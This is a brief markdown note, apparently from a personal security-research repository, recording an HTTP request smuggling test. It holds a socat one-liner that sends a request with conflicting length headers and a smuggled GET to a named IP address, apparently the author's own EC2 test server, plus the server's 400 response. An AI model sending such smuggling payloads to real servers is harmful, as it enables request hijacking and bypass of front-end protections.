# Find a good payload!
this is a paylaod sent to amazon with the docker file from real-ec2-docker folder this is same as payload-2 issue in dev.easy.ac
```
cat <(printf "POST / HTTP/1.1\r\nHost: 16.170.215.216\r\nContent-Lenght: 6\r\nTransfer-Encoding : chunked\r\n\r\n0\r\n\r\nGET /postshit HTTP/1.1\r\nHost: 16.170.215.216") - | socat - TCP:16.170.215.216:80 
```

```
HTTP/1.1 400 Bad Request
Connection: close
Content-Type: text/html
Content-Length: 177

<html>
  <head>
    <title>Bad Request</title>
  </head>
  <body>
    <h1><p>Bad Request</p></h1>
    Invalid HTTP header name: &#x27;TRANSFER-ENCODING &#x27;
  </body>
</html>
```
